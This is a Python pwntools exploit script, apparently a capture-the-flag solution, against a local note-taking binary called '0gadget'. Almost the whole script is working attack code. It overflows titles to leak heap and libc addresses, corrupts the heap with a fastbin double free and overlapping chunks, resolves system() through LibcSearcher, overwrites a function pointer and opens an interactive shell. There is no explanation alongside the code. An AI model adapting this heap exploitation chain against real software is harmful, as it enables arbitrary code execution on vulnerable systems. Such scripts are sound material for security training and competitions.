#!/usr/bin/env python
from pwn import *
context.log_level='debug'
p=process('./0gadget')

ru=lambda s:p.recvuntil(s)
sl=lambda s:p.sendline(s)
sd=lambda s:p.send(s)

def menu(i):
    ru('Your choice: ')
    sl(str(i))

def remark(payload):
    ru('REMARK: ')
    sd(payload)

def new(size,title,content,payload='payload\n'):
    menu(1)
    ru('please input the note size: ')
    sl(str(size))
    ru('Please input the title: ')
    sd(title)
    ru('Please input the content: ')
    sd(content)
    remark(payload)

def delete(index,payload='payload\n'):
    menu(2)
    ru('Which Note do you want to delete: ')
    sl(str(index))
    remark(payload)

def show(index,payload='payload\n'):
    menu(3)
    ru('Which Note do you want to show: ')
    sl(str(index))

def debugf(load=''):
    gdb.attach(p,load)

# zuoshenmene 
new(0x70,'a'*0x90+'\x10','a\n')                # 0
show(0)
ru('note title: '+'a'*0x90)
heap=u64(ru('\n').strip('\n').ljust(8,'\x00'))-0x10
print(hex(heap))
ru('REMARK: ')
sl('a\n')


new(0x70,'a'*0x90+'\x10','a\n')                # 1 same with 0
new(0x80,'a\n','a\n')                     # 2      
new(0x80,'a'*0x90+'\x10','a\n')           # 3    same with 2
delete(2)
show(3)

ru('content: ')
libc=u64(ru('REMARK: ')[0:8])
sl('a\n')

new(0x80,'a\n','a\n')                   # 2

new(0x70,'a\n','a\n')                   # 4


new(0x50,'a\n','a\n')                
new(0x50,'a\n','a\n')                 

# debugf('nb 400CCB')
new(0x50,'a'*0x90+'\x10','a\n')       

delete(7)
delete(5)
delete(6)

new(0x50,'a\n',p64(0x81))           # 5
new(0x50,'a\n','a\n')               # 6
new(0x50,'a\n','a\n')               # 7 same with 5

debugf()
delete(0)
delete(4)
delete(1)

target=libc-0x38
new(0x70,'a\n',p64(target)+'\n')
new(0x70,'a\n','a\n')
new(0x70,'a\n','a\n')
new(0x70,'a\n','\x00'*0x8*0x5+p64(0x602068))

malloc_hook=libc-0x68
from LibcSearcher import *
obj=LibcSearcher('__malloc_hook',malloc_hook)
hook_libc=obj.dump('__malloc_hook')
system_libc=obj.dump('system')
system_libc=malloc_hook-hook_libc+system_libc
print(hex(system_libc))
new(0x70,'a\n',p64(system_libc)+'\n')
p.interactive()